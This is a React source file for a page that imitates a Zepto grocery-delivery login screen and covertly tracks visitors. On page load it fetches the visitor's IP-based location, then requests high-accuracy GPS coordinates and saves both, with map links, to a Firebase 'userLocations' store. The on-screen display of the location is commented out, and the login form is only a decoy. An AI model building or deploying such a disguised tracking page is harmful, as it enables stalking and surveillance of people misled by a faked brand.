import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, push } from "firebase/database";

function App() {
  const [location, setLocation] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);
  const [gpsEnabled, setGpsEnabled] = useState(false);

  useEffect(() => {
    getIPLocation();
  }, []);

  // 📌 Step 1: Get Location Using IP First
  const getIPLocation = async () => {
    try {
      const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`); // Prevent caching
      const data = await response.json();

      const ipLocationData = {
        latitude: data.lat,
        longitude: data.lon,
        method: "IP-based",
        city: data.city,
        country: data.country,
        timestamp: new Date().toISOString(),
        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
      };

      setLocation(ipLocationData);
      saveLocation(ipLocationData);

      // Now check GPS status
      checkGPSPermission();
    } catch (err) {
      console.error("❌ IP Geolocation failed:", err);
      checkGPSPermission();
    }
  };

  // 📌 Step 2: Check GPS Permission & Enable GPS if Needed
  const checkGPSPermission = () => {
    if ("permissions" in navigator) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then((permission) => {
          if (permission.state === "granted") {
            console.log("✅ GPS is enabled. Fetching precise location...");
            setGpsEnabled(true);
            getGPSLocation();
          } else if (permission.state === "prompt") {
            console.log("⚠️ GPS permission required. Asking user...");
            requestGPSPermission();
          } else {
            console.warn("❌ GPS is blocked. Ask user to enable manually.");
            setGpsDenied(true);
          }
        })
        .catch(() => {
          console.warn("⚠️ Permission API failed. Trying GPS...");
          requestGPSPermission();
        });
    } else {
      console.warn("⚠️ Permission API not supported. Trying GPS...");
      requestGPSPermission();
    }
  };

  // 📌 Step 3: Request GPS Permission Manually
  const requestGPSPermission = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setGpsEnabled(true);
          getGPSLocation();
        },
        (error) => {
          console.warn("❌ GPS permission denied:", error);
          setGpsDenied(true);
        }
      );
    }
  };

  // 📌 Step 4: Get Precise GPS Location
  const getGPSLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;

          const gpsLocationData = {
            latitude,
            longitude,
            method: "GPS",
            timestamp: new Date().toISOString(),
            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          };

          setLocation(gpsLocationData);
          saveLocation(gpsLocationData);
          setLoading(false);
        },
        (error) => {
          console.warn("❌ GPS failed:", error);
          setGpsDenied(true);
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 }
      );
    } else {
      console.error("❌ Geolocation not supported");
    }
  };

  // 📌 Save Location to Firebase
  const saveLocation = async (locationData) => {
    const locationRef = ref(database, "userLocations");
    await push(locationRef, locationData);
  };

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#F6F6F6",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          textAlign: "center",
          width: "90%",
          maxWidth: "360px",
          backgroundColor: "white",
          padding: "24px",
          borderRadius: "10px",
          boxShadow: "0px 2px 10px rgba(0,0,0,0.1)",
        }}
      >
        <h1 style={{ color: "#333", fontSize: "28px", fontWeight: "bold", marginBottom: "8px" }}>
          Welcome to Zepto
        </h1>
        <p style={{ color: "#777", fontSize: "14px", marginBottom: "20px" }}>
          Get groceries and essentials delivered in minutes.
        </p>

        <input
          type="text"
          placeholder="Enter Mobile Number"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#FF1654",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            marginTop: "10px",
          }}
        >
          Get OTP
        </button>
        <p
          style={{
            color: "#FF1654",
            fontSize: "14px",
            marginTop: "10px",
            cursor: "pointer",
          }}
        >
          Need Help?
        </p>

        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />

        <p style={{ fontSize: "14px", color: "#606770" }}>
          By continuing, you agree to Zepto's{" "}
          <span style={{ color: "#FF1654", cursor: "pointer" }}>Terms of Service</span> &{" "}
          <span style={{ color: "#FF1654", cursor: "pointer" }}>Privacy Policy</span>.
        </p>

        {/* Location Info */}
        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? (
            <p>Fetching location...</p>
          ) : location ? (
            <div>
              <p>Latitude: {location.latitude}</p>
              <p>Longitude: {location.longitude}</p>
              {location.city && <p>City: {location.city}</p>}
              {location.country && <p>Country: {location.country}</p>}
              <p>Method: {location.method}</p>
              <a
                href={location.mapLink}
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  color: "#FF1654",
                  textDecoration: "none",
                  fontWeight: "bold",
                }}
              >
                View on Google Maps
              </a>
            </div>
          ) : gpsDenied ? (
            <p style={{ color: "red", fontWeight: "bold" }}>
              GPS is blocked. Please enable location services manually.
            </p>
          ) : (
            <p>Could not retrieve location</p>
          )}
        </div> */}
      </div>
    </div>
  );
}

export default App;
